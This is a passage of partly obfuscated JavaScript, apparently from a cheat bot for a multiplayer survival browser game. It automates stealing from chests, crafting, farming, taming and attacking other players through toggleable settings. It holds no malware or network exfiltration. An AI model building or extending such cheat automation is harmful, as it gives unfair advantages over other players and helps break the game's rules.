            autoBuyAllGoldLastSent = performance.now();
          }
        }
        if (myPlayer) {
          if (Settings.TakeChest.e) {
            if (Settings.TakeChest.targetChests.length > 0) {
              for (let i = 0, targets = Settings.TakeChest.targetChests, len = targets.length; i < len; i++) {
                const target = targets[i];
                const pid = target.pid;
                const id = target.id;
                const chest = world.fast_units[pid * world.max_units + id];
                if (chest && chest.info > 0 && Utils.dist(myPlayer, chest) < 300) {
                  send_steal(pid, id);
                }
              }
            }
          }
          if (Settings.PutChest.e && !isWaitPutChest) {
            if (Settings.PutChest.targetChests.length > 0) {
              for (let i = 0, targets = Settings.PutChest.targetChests, len = targets.length; i < len; i++) {
                const target = targets[i];
                const invId = target.invId;
                if (user.inv.n[invId] === 0) {
                  continue;
                }
                const pid = target.pid;
                const id = target.id;
                const chest = world.fast_units[pid * world.max_units + id];
                if (chest && Utils.dist(myPlayer, chest) < 300 && isValidToPutChest(chest, invId)) {
                  let invAmount = user.inv.n[invId];
                  if (invId === INV.BERRY) {
                    if (invAmount <= 100) {
                      continue;
                    }
                    invAmount -= 100;
                    isWaitPutChest = true;
                    workerTimers.setTimeout(() => {
                      isWaitPutChest = false;
                    }, 100 + PingCounter);
                  }
                  const amountCanPut = 8000 - chest.info;
                  const amount = invAmount > amountCanPut ? amountCanPut : invAmount;
                  send_put_chest(invId, Math.min(255, amount), chest.pid, chest.id);
                }
              }
            }
          }
          if (Settings.AutoPutChest.e) {
            const invIds = Settings.AutoPutChest.invIds;
            for (let i = 0, len = invIds.length; i < len; i++) {
              const invId = invIds[i];
              const usedChests = new Set();
              if (user.inv.n[invId]) {
                if (!chestsForAutoPut[invId] || chestsForAutoPut[invId].action / 2 - 1 !== invId || chestsForAutoPut[invId].info >= 8000 || Utils.dist(chestsForAutoPut[invId], myPlayer) > 150 || chestsForAutoPut[invId].lock && !chestsForAutoPut[invId].ally) {
                  chestsForAutoPut[invId] = null;
                  let isChestNearbyWithInvId = false;
                  for (const chest of world.units[ITEMS.CHEST]) {
                    const chestKey = "" + chest.pid + "-" + chest.id;
                    if ((!chest.lock || chest.ally) && chest.action / 2 - 1 === invId && chest.info < 8000 && Utils.dist(myPlayer, chest) <= 150 && !usedChests.has(chestKey)) {
                      chestsForAutoPut[invId] = chest;
                      isChestNearbyWithInvId = true;
                    }
                  }
                  if (!isChestNearbyWithInvId) {
                    for (const chest of world.units[ITEMS.CHEST]) {
                      const chestKey = "" + chest.pid + "-" + chest.id;
                      if ((!chest.lock || chest.ally) && chest.action / 2 - 1 === -1 && Utils.dist(myPlayer, chest) <= 150 && !usedChests.has(chestKey)) {
                        chestsForAutoPut[invId] = chest;
                        break;
                      }
                    }
                  }
                }
                if (chestsForAutoPut[invId]) {
                  const invAmount = user.inv.n[invId];
                  const chestToPut = chestsForAutoPut[invId];
                  const amountCanPut = 8000 - chestToPut.info;
                  const amount = invAmount > amountCanPut ? amountCanPut : invAmount;
                  send_put_chest(invId, Math.min(255, amount), chestToPut.pid, chestToPut.id);
                }
              }
            }
          }
          if (Settings.AutoTakeChest.e) {
            for (const chest of world.units[ITEMS.CHEST]) {
              if ((!chest.lock || chest.ally) && Utils.dist(myPlayer, chest) <= 150 && Settings.AutoTakeChest.invIds.includes(chest.action / 2 - 1)) {
                send_steal(chest.pid, chest.id);
              }
            }
          }
          if (Settings.AutoIce.e && user.inv.n[INV.ICE] && performance.now() - eatIceLastSent > PingCounter + 100) {
            if (user.gauges.l < 1 && Settings.AutoIce.eatForHeal && user.inv.n[INV.ICE] > Settings.AutoIce.iceHealTriggerAmount) {
              if (Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) < 5) {
                if (user.gauges.wa - (myPlayer.dist_lava > 0 ? 0.25 : 0) < 0.36) {
                  const needed_wa = 0.36 - (user.gauges.wa - (myPlayer.dist_lava > 0 ? 0.25 : 0));
                  const ice_to_eat = Math.max(0, Math.ceil(needed_wa / 0.1));
                  for (let i = 0; i < ice_to_eat; i++) {
                    send_select_inv(INV.ICE);
                  }
                  eatIceLastSent = performance.now();
                }
              } else if (user.gauges.wa === 0 && myPlayer.dist_lava > 0) {
                send_select_inv(INV.ICE);
                eatIceLastSent = performance.now();
              }
            } else if ((myPlayer.dist_lava > 0 || myPlayer.dist_desert > 0 && world.time === 0 || myPlayer.fly === 1) && user.gauges.wa === 0) {
              send_select_inv(INV.ICE);
              eatIceLastSent = performance.now();
            }
          }
        } else if (Settings.AutoIce.e && user.inv.n[INV.ICE] && performance.now() - eatIceLastSent > PingCounter + 100) {
          if (user.gauges.l < 1 && Settings.AutoIce.eatForHeal && user.inv.n[INV.ICE] > Settings.AutoIce.iceHealTriggerAmount) {
            if (Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) < 5) {
              if (user.gauges.wa - 0.25 < 0.36) {
                const needed_wa = 0.36 - (user.gauges.wa - 0.25);
                const ice_to_eat = Math.max(0, Math.ceil(needed_wa / 0.1));
                for (let i = 0; i < ice_to_eat; i++) {
                  send_select_inv(INV.ICE);
                }
                eatIceLastSent = performance.now();
              }
            } else if (user.gauges.wa === 0) {
              send_select_inv(INV.ICE);
              eatIceLastSent = performance.now();
            }
          } else if (user.gauges.wa === 0) {
            send_select_inv(INV.ICE);
            eatIceLastSent = performance.now();
          }
        }
        if (Settings.AutoCraft.e && LastCrafted !== null) {
          send_craft(LastCrafted);
        }
        if (Settings.AutoRecycle.e && LastRecycled !== null) {
          send_recycle(LastRecycled);
        }
        if (Settings.AutoCraftSpikes.e) {
          if (Settings.AutoCraftSpikes.p === "Highest Craftale") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_REIDITE_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_REIDITE_SPIKE);
              send_craft(__p_UmX7_CRAFT_REIDITE_WALL);
              send_craft(__p_UmX7_CRAFT_AMETHYST_WALL);
              send_craft(__p_UmX7_CRAFT_DIAMOND_WALL);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            } else if (canCraftWithManyTimes(__p_UmX7_CRAFT_AMETHYST_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_AMETHYST_SPIKE);
              send_craft(__p_UmX7_CRAFT_AMETHYST_WALL);
              send_craft(__p_UmX7_CRAFT_DIAMOND_WALL);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            } else if (canCraftWithManyTimes(__p_UmX7_CRAFT_DIAMOND_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_DIAMOND_SPIKE);
              send_craft(__p_UmX7_CRAFT_DIAMOND_WALL);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            } else if (canCraftWithManyTimes(__p_UmX7_CRAFT_GOLD_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_GOLD_SPIKE);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            } else if (canCraftWithManyTimes(__p_UmX7_CRAFT_STONE_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_STONE_SPIKE);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            } else if (canCraftWithManyTimes(__p_UmX7_CRAFT_WOOD_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_WOOD_SPIKE);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          }
          if (Settings.AutoCraftSpikes.p === "Reidite Spike") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_REIDITE_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_REIDITE_SPIKE);
              send_craft(__p_UmX7_CRAFT_REIDITE_WALL);
              send_craft(__p_UmX7_CRAFT_AMETHYST_WALL);
              send_craft(__p_UmX7_CRAFT_DIAMOND_WALL);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          } else if (Settings.AutoCraftSpikes.p === "Amethyst Spike") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_AMETHYST_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_AMETHYST_SPIKE);
              send_craft(__p_UmX7_CRAFT_AMETHYST_WALL);
              send_craft(__p_UmX7_CRAFT_DIAMOND_WALL);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          } else if (Settings.AutoCraftSpikes.p === "Diamond Spike") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_DIAMOND_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_DIAMOND_SPIKE);
              send_craft(__p_UmX7_CRAFT_DIAMOND_WALL);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          } else if (Settings.AutoCraftSpikes.p === "Gold Spike") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_GOLD_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_GOLD_SPIKE);
              send_craft(__p_UmX7_CRAFT_GOLD_WALL);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          } else if (Settings.AutoCraftSpikes.p === "Stone Spike") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_STONE_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_STONE_SPIKE);
              send_craft(__p_UmX7_CRAFT_STONE_WALL);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          } else if (Settings.AutoCraftSpikes.p === "Wood Spike") {
            if (canCraftWithManyTimes(__p_UmX7_CRAFT_WOOD_SPIKE, user.inv.n)) {
              send_craft(__p_UmX7_CRAFT_WOOD_SPIKE);
              send_craft(__p_UmX7_CRAFT_WOOD_WALL);
            }
          }
        }
        if (Settings.SpikeCrafter.e) {
          if (!user.inv.n[INV.BERRY] && myPlayer && performance.now() - reiditeSpikeCrafterTakeFoodLastTime > PingCounter + 200) {
            for (const chest of world.units[ITEMS.CHEST]) {
              if ((!chest.lock || chest.ally) && chest.action / 2 - 1 === INV.BERRY && Utils.dist(myPlayer, chest) <= 150) {
                send_steal(chest.pid, chest.id);
                reiditeSpikeCrafterTakeFoodLastTime = performance.now();
              }
            }
          }
          let invId;
          switch (Settings.SpikeCrafter.target) {
            case "Reidite Spike":
              invId = INV.REIDITE_SPIKE;
              break;
            case "Amethyst Spike":
              invId = INV.AMETHYST_SPIKE;
              break;
            case "Diamond Spike":
              invId = INV.DIAMOND_SPIKE;
              break;
            case "Gold Spike":
              invId = INV.GOLD_SPIKE;
              break;
            case "Stone Spike":
              invId = INV.STONE_SPIKE;
              break;
            case "Wood Spike":
              invId = INV.WOOD_SPIKE;
              break;
            case "Wood Wall":
              invId = INV.WOOD_WALL;
              break;
          }
          if (myPlayer) {
            if (user.inv.n[invId]) {
              if (!chestsForCraftBot[invId] || chestsForCraftBot[invId].action / 2 - 1 !== invId || chestsForCraftBot[invId].info >= 8000 || Utils.dist(chestsForCraftBot[invId], myPlayer) > 150) {
                chestsForCraftBot[invId] = null;
                let isChestNearbyWithInvId = false;
                for (const chest of world.units[ITEMS.CHEST]) {
                  if ((!chest.lock || chest.ally) && chest.action / 2 - 1 === invId && chest.info < 8000 && Utils.dist(myPlayer, chest) <= 150) {
                    chestsForCraftBot[invId] = chest;
                    isChestNearbyWithInvId = true;
                  }
                }
                if (!isChestNearbyWithInvId) {
                  for (const chest of world.units[ITEMS.CHEST]) {
                    if ((!chest.lock || chest.ally) && chest.action / 2 - 1 === -1 && Utils.dist(myPlayer, chest) <= 150) {
                      chestsForCraftBot[invId] = chest;
                      break;
                    }
                  }
                }
              }
              if (chestsForCraftBot[invId]) {
                const invAmount = user.inv.n[invId];
                const chestToPut = chestsForCraftBot[invId];
                const amountCanPut = 8000 - chestToPut.info;
                const amount = invAmount > amountCanPut ? amountCanPut : invAmount;
                send_put_chest(invId, Math.min(255, amount), chestToPut.pid, chestToPut.id);
              }
            }
          }
          const missingIngredients = getMissingRawIngredients(invId, user.inv.n);
          if (missingIngredients && Object.keys(missingIngredients).length > 0) {
            if (myPlayer && performance.now() - reiditeSpikeCrafterTakeResLastTime > PingCounter + 200) {
              for (const invId in missingIngredients) {
                if (!chestsForCraftBot[invId] || chestsForCraftBot[invId].action / 2 - 1 !== invId || Utils.dist(myPlayer, chestsForCraftBot[invId]) > 150 || chestsForCraftBot[invId].lock && !chestsForCraftBot[invId].ally) {
                  chestsForCraftBot[invId] = null;
                  for (const chest of world.units[ITEMS.CHEST]) {
                    if ((!chest.lock || chest.ally) && chest.action / 2 - 1 === Number(invId) && Utils.dist(myPlayer, chest) <= 150) {
                      chestsForCraftBot[invId] = chest;
                      break;
                    }
                  }
                }
                if (chestsForCraftBot[invId]) {
                  send_steal(chestsForCraftBot[invId].pid, chestsForCraftBot[invId].id);
                }
              }
              reiditeSpikeCrafterTakeResLastTime = performance.now();
            }
          } else {
            craftInv(invId);
          }
        }
        if (Settings.SmartCraft.e) {
          let invId = temp.smartCraft.mode;
          const missingIngredients = getMissingRawIngredients(invId, user.inv.n);
          if (missingIngredients && Object.keys(missingIngredients).length === 0) {
            craftInv(invId);
          } else {
            console.log(missingIngredients);
            Settings.SmartCraft.e = false;
            guiControls.SmartCraft.children[2].title = Settings.SmartCraft.e ? "⏸️ Pause" : "⚙️ Start Crafting";
          }
        }
      }
      if (myPlayer) {
        if (ThisTabMiniMized) {
          game.update_connection();
          game.update_scene();
        }
        if (Settings.AutoBuild.e && !Settings.AutoSpike.e && !Settings.AutoWall.e && (!Settings.AutoPvP.e || !Settings.AutoPvP.isAutoSpike)) {
          const buildInvSlot = user.inv.can_select.find(_param_779 => {
            return IS_BUILD_FOR_AUTOBUILD[_param_779.id] || IS_SEED[_param_779.id];
          });
          const invIdToBuild = buildInvSlot ? buildInvSlot.id : null;
          if (invIdToBuild) {
            if (IS_BUILD_FOR_AUTOBUILD[invIdToBuild]) {
              let PI2 = Math.PI * 2;
              let angle255 = Math.floor((myPlayer.angle + PI2) % PI2 * 255 / PI2);
              send_build(invIdToBuild, angle255);
            } else if (IS_SEED[invIdToBuild] && performance.now() - sowSeedLastTime > 300) {
              sowSeedLastTime = performance.now();
              for (let i = 0; i < 256; i += 2) {
                send_build(invIdToBuild, i);
              }
              send_build(invIdToBuild, 0, 1);
              send_build(invIdToBuild, 32, 1);
              send_build(invIdToBuild, 64, 1);
              send_build(invIdToBuild, 96, 1);
              send_build(invIdToBuild, 128, 1);
              send_build(invIdToBuild, 160, 1);
              send_build(invIdToBuild, 192, 1);
              send_build(invIdToBuild, 224, 1);
            }
          } else {
            Settings.AutoBuild.e = false;
            gui?.refresh();
          }
        }
        if (Settings.AutoFarm.e) {
          let __p_wbHb_farmRect_x = Settings.AutoFarm.x;
          let __p_wbHb_farmRect_y = Settings.AutoFarm.y;
          let __p_wbHb_farmRect_width = Settings.AutoFarm.xx - Settings.AutoFarm.x;
          let __p_wbHb_farmRect_height = Settings.AutoFarm.yy - Settings.AutoFarm.y;
          const allFarmableObjects = [...world.units[ITEMS.PUMPKIN_SEED], ...world.units[ITEMS.SEED], ...world.units[ITEMS.WHEAT_SEED], ...world.units[ITEMS.THORNBUSH_SEED], ...world.units[ITEMS.GARLIC_SEED], ...world.units[ITEMS.CARROT_SEED], ...world.units[ITEMS.ALOE_VERA_SEED], ...world.units[ITEMS.WATERMELON_SEED], ...world.units[ITEMS.TOMATO_SEED]];
          const detectionRangeSq = 48400;
          let target = null;
          let __p_4fGB_closestOverall_obj = null;
          let __p_4fGB_closestOverall_distSq = -1;
          for (const obj of allFarmableObjects) {
            if (!obj.info || obj.info === 10 || !Settings.AutoFarm.water && obj.info === 16 || !(__p_wbHb_farmRect_x < obj.x + 50) || !(__p_wbHb_farmRect_x + __p_wbHb_farmRect_width > obj.x - 50) || !(__p_wbHb_farmRect_y < obj.y + 50) || !(__p_wbHb_farmRect_y + __p_wbHb_farmRect_height > obj.y - 50)) {
              continue;
            }
            const distSq = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
            if (distSq <= detectionRangeSq) {
              target = obj;
              break;
            }
            if (__p_4fGB_closestOverall_distSq === -1 || distSq < __p_4fGB_closestOverall_distSq) {
              __p_4fGB_closestOverall_distSq = distSq;
              __p_4fGB_closestOverall_obj = obj;
            }
          }
          if (!target) {
            target = __p_4fGB_closestOverall_obj;
          }
          if (target && user.gauges.l * 200 > 120) {
            const dxAbs = Math.abs(myPlayer.x - target.x);
            const dyAbs = Math.abs(myPlayer.y - target.y);
            let actionType = 0;
            let equipped = false;
            switch (target.info) {
              case 1:
              case 2:
              case 3:
                actionType = 2;
                if (user.inv.n[INV.PITCHFORK_2] && myPlayer.right !== INV.PITCHFORK_2) {
                  send_select_inv(INV.PITCHFORK_2);
                } else if (user.inv.n[INV.PITCHFORK] && myPlayer.right !== INV.PITCHFORK) {
                  send_select_inv(INV.PITCHFORK);
                }
                break;
              case 16:
              case 17:
              case 18:
              case 19:
                if (Settings.AutoFarm.water) {
                  if (user.inv.n[INV.WATERING_CAN_FULL]) {
                    if (myPlayer.right !== INV.WATERING_CAN_FULL) {
                      send_select_inv(INV.WATERING_CAN_FULL);
                    }
                    actionType = 1;
                  }
                } else {
                  if (user.inv.n[INV.PITCHFORK_2]) {
                    if (INV.PITCHFORK_2 !== myPlayer.right) {
                      send_select_inv(INV.PITCHFORK_2);
                    }
                  } else if (user.inv.n[INV.PITCHFORK] && INV.PITCHFORK !== myPlayer.right) {
                    send_select_inv(INV.PITCHFORK);
                  }
                  actionType = 2;
                }
                break;
            }
            if (oldUserDir === 0) {
              const dx = myPlayer.x - target.x;
              const dy = myPlayer.y - target.y;
              if (Math.abs(dx) < 50 && Math.abs(dy) < 50) {
                send_move(0);
              } else {
                let velocity = 0;
                if (dx > 50) {
                  velocity += 1;
                } else if (dx < -50) {
                  velocity += 2;
                }
                if (dy > 50) {
                  velocity += 8;
                } else if (dy < -50) {
                  velocity += 4;
                }
                send_move(velocity);
              }
              const actionRange = actionType === 1 ? 120 : 300;
              if (dxAbs < actionRange && dyAbs < actionRange) {
                const angle = calcAngle(myPlayer, target, false);
                if (angle) {
                  Settings.AutoFarm.angle = angle;
                  send_attack(angle);
                  stop_attack();
                }
              }
            }
          } else if (oldUserDir === 0) {
            const dx = myPlayer.x - Settings.AutoFarm.sx;
            const dy = myPlayer.y - Settings.AutoFarm.sy;
            if (Math.abs(dx) < 50 && Math.abs(dy) < 50) {
              send_move(0);
            } else {
              let velocity = 0;
              if (dx > 50) {
                velocity += 1;
              } else if (dx < -50) {
                velocity += 2;
              }
              if (dy > 50) {
                velocity += 8;
              } else if (dy < -50) {
                velocity += 4;
              }
              send_move(velocity);
            }
          }
        }
        if (Settings.AutoCrown.e && user.inv.n[INV.CROWN_OF_THE_ANGEL] && myPlayer.ghost) {
          for (const obj of world.units[ITEMS.RESURRECTION]) {
            if (Utils.dist(myPlayer, obj) < 300) {
              send_resurrection(obj.pid, obj.id);
              break;
            }
          }
        }
        if (Settings.ExitVehicle.e) {
          if (myPlayer.vehicle !== 0) {
            if (myPlayer.speed < 100 && performance.now() - leapoffLastSent > PingCounter + 125) {
              leapoffLastSent = performance.now();
              send_select_inv(myPlayer.vehicle);
            }
          } else {
            Settings.ExitVehicle.e = false;
          }
        }
        if (Settings.AutoTame.e && !AutoTameIsWaiting && myPlayer.right === INV.SADDLE) {
          let tameableMob = [...world.units[ITEMS.BABY_DRAGON], ...world.units[ITEMS.BABY_LAVA], ...world.units[ITEMS.GOLDEN_HEN], ...world.units[ITEMS.BABY_MAMMOTH], ...world.units[ITEMS.HAWK], ...world.units[ITEMS.CRAB_BOSS], ...world.units[ITEMS.BOAR]];
          let nearbyTameableMob = tameableMob.filter(mob => {
            return Utils.dist(myPlayer, mob) <= 200;
          });
          if (nearbyTameableMob.length > 0) {
            const allNearbyCalm = nearbyTameableMob.every(mob => {
              return mob.info === 0;
            });
            if (allNearbyCalm) {
              const angle = calcAngle(myPlayer, nearbyTameableMob[0], true);
              Settings.AutoTame.angle = angle;
              send_angle(angle);
              send_attack(angle);
              stop_attack();
              AutoTameIsWaiting = true;
              workerTimers.setTimeout(() => {
                AutoTameIsWaiting = false;
              }, 580 + PingCounter);
            } else {
              Settings.AutoTame.angle = null;
            }
          } else {
            Settings.AutoTame.angle = null;
          }
        } else {
          Settings.AutoTame.angle = null;
        }
        if (Settings.ExtractorTake.e || Settings.AutoSteal.e) {
          const extractor_ids = [ITEMS.EXTRACTOR_MACHINE_STONE, ITEMS.EXTRACTOR_MACHINE_GOLD, ITEMS.EXTRACTOR_MACHINE_DIAMOND, ITEMS.EXTRACTOR_MACHINE_AMETHYST, ITEMS.EXTRACTOR_MACHINE_REIDITE];
          extractor_ids.forEach(_param_780 => {
            const extractor = world.units[_param_780];
            if (Array.isArray(extractor)) {
              for (const obj of extractor) {
                if (myPlayer && obj && Utils.dist(myPlayer, obj) <= 330) {
                  send_take_extractors(obj.pid, obj.id, _param_780);
                }
              }
            }
          });
        }
        if (Settings.ExtractorPut.e) {
          const extractor_ids = [ITEMS.EXTRACTOR_MACHINE_STONE, ITEMS.EXTRACTOR_MACHINE_GOLD, ITEMS.EXTRACTOR_MACHINE_DIAMOND, ITEMS.EXTRACTOR_MACHINE_AMETHYST, ITEMS.EXTRACTOR_MACHINE_REIDITE];
          extractor_ids.forEach(extractorType => {
            const extractor = world.units[extractorType];
            if (Array.isArray(extractor)) {
              for (const obj of extractor) {
                if (myPlayer && obj && Utils.dist(myPlayer, obj) <= 330) {
                  send_put_extractors(obj.pid, obj.id, extractorType);
                }
              }
            }
          });
        }
        if (Settings.AutoSteal.e) {
          let chests = world.units[ITEMS.CHEST].filter(chest => {
            return (chest.ally || !chest.lock) && Utils.dist(myPlayer, chest) <= 300;
          });
          for (let i = 0, len = chests.length; i < len; i++) {
            const chest = chests[i];
            send_steal(chest.pid, chest.id);
            if (chest.info) {
              send_steal(chest.pid, chest.id);
              send_steal(chest.pid, chest.id);
              send_steal(chest.pid, chest.id);
            }
          }
        }
        if (Settings.AutoBreadPut.e) {
          let obj = world.units[ITEMS.BREAD_OVEN];
          for (let i = 0; i < obj.length; i++) {
            if (myPlayer && obj[i] && Utils.dist(myPlayer, obj[i]) <= 330) {
              send_put_wood_Oven(obj[i].pid, obj[i].id);
              send_put_flour_Oven(obj[i].pid, obj[i].id);
            }
          }
        }
        if (Settings.AutoBreadTake.e || Settings.AutoSteal.e) {
          let obj = world.units[ITEMS.BREAD_OVEN];
          for (let i = 0; i < obj.length; i++) {
            if (myPlayer && obj[i] && Utils.dist(myPlayer, obj[i]) <= 330) {
              send_take_bread(obj[i].pid, obj[i].id);
            }
          }
        }
        if (Settings.AutoBreadPut.e) {
          let obj = world.units[ITEMS.WINDMILL];
          for (let i = 0; i < obj.length; i++) {
            if (myPlayer && obj[i] && Utils.dist(myPlayer, obj[i]) <= 330) {
              send_put_windmill(obj[i].pid, obj[i].id);
            }
          }
        }
        if (Settings.AutoBreadTake.e || Settings.AutoSteal.e) {
          let obj = world.units[ITEMS.WINDMILL];
          for (let i = 0; i < obj.length; i++) {
            if (myPlayer && obj[i] && Utils.dist(myPlayer, obj[i]) <= 330) {
              send_take_windmill(obj[i].pid, obj[i].id);
            }
          }
        }
        if (Settings.AutoFire.e && !user.craft.crafting) {
          if (user.inv.n[INV.CAMPFIRE] || user.inv.n[INV.BIG_CAMPFIRE]) {
            putFireTime = performance.now();
            let pi2 = Math.PI * 2;
            let playerAngle = myPlayer.angle;
            let angle255 = Math.floor((playerAngle + pi2) % pi2 * 255 / pi2);
            const invToPlace = user.inv.n[INV.CAMPFIRE] ? INV.CAMPFIRE : INV.BIG_CAMPFIRE;
            send_build(invToPlace, angle255);
            for (let i = 1; i < 31; i += 2) {
              send_build(invToPlace, angle255 + i);
              send_build(invToPlace, angle255 - i);
            }
          } else if (performance.now() - putFireTime > 1000) {
            send_craft(__p_UmX7_CRAFT_CAMPFIRE);
          }
        }
        if (Settings.AutoTotem.e && !user.totem.wait && user.team.length === 0) {
          let totems = world.units[ITEMS.TOTEM];
          for (let i = 0, len = totems.length; i < len; i++) {
            const totem = totems[i];
            if (Utils.dist(myPlayer, totem) < 300 && !((totems.info & 16) >> 4) && totem.info < 8) {
              send_join_totem(totem.pid, totem.id);
            }
          }
        }
        if (Settings.AutoKsDeadBox.e) {
          const dead_boxs = world.units[ITEMS.DEAD_BOX].filter(box => {
            return !box.isAnimalBox;
          });
          let nearestDeadBox = null;
          if (dead_boxs.length > 0) {
            nearestDeadBox = dead_boxs.reduce((a, b) => {
              if (Utils.dist(myPlayer, a) < Utils.dist(myPlayer, b)) {
                return a;
              } else {
                return b;
              }
            });
          }
          if (nearestDeadBox) {
            let myDamage = getDamageOfPlayer(myPlayer, true);
            const myHitTime = performance.now() + PingCounter / 2 + 62.5;
            if (getHpInFuture(nearestDeadBox, myHitTime) <= myDamage) {
              const myDamageRange = getDamageRangeOfPlayer(myPlayer);
              if (Utils.dist(myPlayer, nearestDeadBox) <= myDamageRange) {
                workerTimers.setTimeout(() => {
                  const angle = calcAngle(myPlayer, nearestDeadBox, true);
                  Settings.AutoKsDeadBox.angle = angle;
                  send_attack(angle);
                  stop_attack();
                }, 100);
              } else {
                Settings.AutoKsDeadBox.angle = null;
              }
            } else {
              Settings.AutoKsDeadBox.angle = null;
            }
          } else {
            Settings.AutoKsDeadBox.angle = null;
          }
        }
        if (Settings.AntiHood.e && user.inv.n[INV.PITCHFORK] && !IS_WEAPON[myPlayer.right] && performance.now() - antiHoodTime > 500 + PingCounter) {
          const range = myPlayer.fly === 1 ? 269.8 : 205.6;
          const enemy = world.units[ITEMS.PLAYERS].find(player => {
            return player.hoodTimerV >= 0.8 && !player.ally && myPlayer.fly === player.fly && (Utils.dist(myPlayer, PredictPos(player)) < range || Utils.dist(myPlayer, player) < range);
          });
          if (enemy) {
            let oldRight;
            if (myPlayer.right !== INV.PITCHFORK && user.inv.n[INV.PITCHFORK]) {
              oldRight = myPlayer.right;
              send_select_inv(INV.PITCHFORK);
            }
            antiHoodTime = performance.now();
            Settings.AntiHood.angle = send_attack_item(myPlayer, enemy);
            workerTimers.setTimeout(() => {
              send_select_inv(oldRight === -1 ? INV.HAND : oldRight);
            }, 100);
          } else {
            Settings.AntiHood.angle = null;
          }
        } else {
          Settings.AntiHood.angle = null;
        }
        if (Settings.SpamBuild.e && !user.build.wait && user.craft.preview !== -1) {
          send_build(user.craft.preview, radianTo255Angle(myPlayer.angle));
          workerTimers.setTimeout(() => {
            send_build(user.craft.preview, radianTo255Angle(myPlayer.angle));
          }, 50);
        }
        if (Settings.AutoEme.e) {
          const target = AutoEme_farmLocations[AutoEme_currentIndex];
          let dir = PathFinder3(myPlayer, target);
          if (oldUserDir === 0) {
            send_move(dir);
          }
          if (!dir) {
            if (!IS_PICKAXE[myPlayer.right] && performance.now() - AutoEme_usePickLastTime > 250 + PingCounter) {
              const can_select = user.inv.can_select;
              for (let i = 0, len = can_select.length; i < len; i++) {
                const invId = can_select[i].id;
                if (IS_PICKAXE[invId]) {
                  client.select_inv(invId);
                  AutoEme_usePickLastTime = performance.now();
                  break;
                }
              }
            }
            let angle360 = 0;
            switch (AutoEme_currentIndex) {
              case 0:
                angle360 = 270;
                break;
              case 1:
                angle360 = 45;
                break;
              case 2:
                angle360 = 160;
                break;
            }
            const angle = toRadian(angle360);
            AutoEme_angle = angle;
            AutoEme_isFarming = true;
            send_attack(toRadian(angle360));
            stop_attack();
          } else {
            AutoEme_angle = null;
          }
        }
        if (world.mode === 6) {
          if (Settings.AutoHamCmty.e) {
            if (myPlayer.right === INV.SUPER_HAMMER) {
              let spikes = [...world.units[ITEMS.SPIKE], ...world.units[ITEMS.STONE_SPIKE], ...world.units[ITEMS.GOLD_SPIKE], ...world.units[ITEMS.DIAMOND_SPIKE], ...world.units[ITEMS.AMETHYST_SPIKE], ...world.units[ITEMS.REIDITE_SPIKE]];
              let nearlySpikes = spikes.filter(_param_781 => {
                return Utils.dist(myPlayer, _param_781) < 125 && !_param_781.ally;
              });
              if (nearlySpikes.length > 0) {
                let nearestSpike = nearlySpikes.reduce((_param_782, _param_783) => {
                  if (Utils.dist(myPlayer, _param_782) < Utils.dist(myPlayer, _param_783)) {
                    return _param_782;
                  } else {
                    return _param_783;
                  }
                });
                let angle = calcAngle(myPlayer, nearestSpike, false);
                Settings.AutoHamCmty.angle = angle;
                send_attack(angle);
                stop_attack();
              } else {
                Settings.AutoHamCmty.angle = null;
              }
            } else {
              Settings.AutoHamCmty.angle = null;
            }
          }
